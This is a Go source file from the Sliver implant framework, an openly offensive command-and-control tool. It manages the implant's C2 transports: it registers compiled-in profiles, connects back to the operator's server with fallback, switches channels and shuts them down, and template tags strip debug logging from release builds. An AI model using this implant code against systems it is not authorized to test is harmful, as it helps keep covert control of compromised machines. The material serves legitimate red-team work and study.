package c2

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <htc2s://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"errors"
	"fmt"
	"sync"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/comm"
)

var (
	// Transports - All active transports on this implant.
	Transports = &c2s{
		Available: []*C2{},
		mutex:     &sync.RWMutex{},
		waiter:    &sync.WaitGroup{},
	}
)

// c2s - Holds all active c2s for this implant.
// This is consumed by some handlers & listeners, as well as the routing system.
type c2s struct {
	Available []*C2           // All transports available (compiled in) to this implant
	Server    *C2             // The transport tied to the C2 server (active connection)
	mutex     *sync.RWMutex   // Concurrency
	waiter    *sync.WaitGroup // Block so that the implant never exits without warning.
}

// Init - Parses all available transport strings and registers them as available transports.
// Then starts the first transport in the list, for reaching back to the server.
func (t *c2s) Init() (err error) {

	// Register all available C2 transports
	for order, profile := range profiles {
		c2, err := NewC2FromBytes(profile)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error parsing C2 profiles: %s", err)
			// {{end}}
			continue
		}

		// Just increase the priority like the order in which they were compiled
		c2.Priority = order

		// And add it as available
		t.Add(c2)
	}
	if len(t.Available) == 0 {
		return errors.New("no available transports")
	}

	// {{if .Config.Debug}}
	log.Printf("Starting connection loop ...")
	// {{end}}

	// Then start the first C2 transport, with fallback if failure
	for _, transport := range t.Available {

		// This might will init the Comm system, but in the case of tunnel-based
		// routing, we have concurrently started this process, and it will only
		// finish its setup once we are out of this Init() function.
		err = transport.Start()

		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Failed to start C2 Channel %s: %s", transport.Profile.ID, err)
			// {{end}}

			// Wait if this transport failed.
			time.Sleep(time.Duration(transport.Profile.Interval))
			continue
		}

		// Else success: set transport as active C2,
		t.mutex.RLock()
		Transports.Server = transport
		t.mutex.RUnlock()

		// Send the registration message, and break
		// the loop as we successfully connected
		transport.Register()
		break
	}

	return nil
}

// Serve - The C2s serve this implant, blocking so that the implant main loop never exits
// TODO: Take advantage of the counter if that can help correctly unfolding various C2s.
func (t *c2s) Serve() {
	t.waiter.Add(1)
	t.waiter.Wait()
}

// Directly add a C2 to the list of available transports
func (t *c2s) AddFromProfile(profile string) (err error) {
	t.mutex.RLock()
	c2, err := NewC2FromBytes(profile)
	if err != nil {
		return err
	}
	t.Available = append(t.Available, c2)
	t.mutex.RUnlock()
	return nil
}

// Add - Add a new active transport to the implant' transport map.
func (t *c2s) Add(c2 *C2) (err error) {
	t.mutex.Lock()
	t.Available = append(t.Available, c2)
	t.mutex.Unlock()
	return
}

// Remove - A transport has terminated its connection, and we remove it.
func (t *c2s) Remove(ID string) (err error) {
	t.mutex.Lock()
	for i, c2 := range t.Available {
		if c2.ID == ID {
			t.Available = append(t.Available[:i], t.Available[i+1:]...)
		}
	}
	// delete(t.Available, ID)
	t.mutex.Unlock()
	return
}

// Get - Returns an active C2 given an ID.
func (t *c2s) Get(ID string) (c2 *C2) {
	for _, transport := range t.Available {
		if transport.ID == ID {
			return transport
		}
	}
	return
}

// Switch - Dynamically switch the active transport, if multiple are available.
func (t *c2s) Switch(ID string) (err error) {

	var next = Transports.Get(ID)
	if next == nil {
		return fmt.Errorf("could not find transport with ID %s", ID)
	}

	// {{if .Config.Debug}}
	log.Printf("Switching the current transport: %s", t.Server.ID)
	log.Printf("New transport: %s", next.ID)
	// {{end}}

	// {{if .Config.CommEnabled}}

	// Close the Comm system, and all comm listeners
	err = comm.PrepareCommSwitch()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Comm Switch error: " + err.Error())
		// {{end}}
	}
	// {{end}}

	// Keep the current transport ID, needed when registering
	// again to the server, for identification purposes.
	oldTransportID := t.Server.ID

	// Cut the current transport
	err = t.Server.Stop()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf(err.Error())
		// {{end}}
	}

	// Start the new one and assign to active server connection.
	err = next.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf(err.Error())
		// {{end}}
		return
	}
	t.Server = next

	// Send a confirmation message, because the server is waiting for it.
	// (by nature the call to switch transports must be asynchronous,
	// without any error return in the same RPC handler)
	next.RegisterTransportSwitch(oldTransportID)

	return nil
}

// Shutdown - Close all availables transports. If the exit parameter is true
// the transports will close their waiter, which will release the main function
// of this implant program. Normally, this is set true when the kill command
// is received, but not for the "disconnect" command (because we just sleep for this one)
func (t *c2s) Shutdown() (err error) {

	// Close the server transport
	err = t.Server.Stop()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf(err.Error())
		// {{end}}
	}

	// Release lock on the implant main if asked to
	// if exit {
	//         t.waiter.Done()
	// }
	return
}
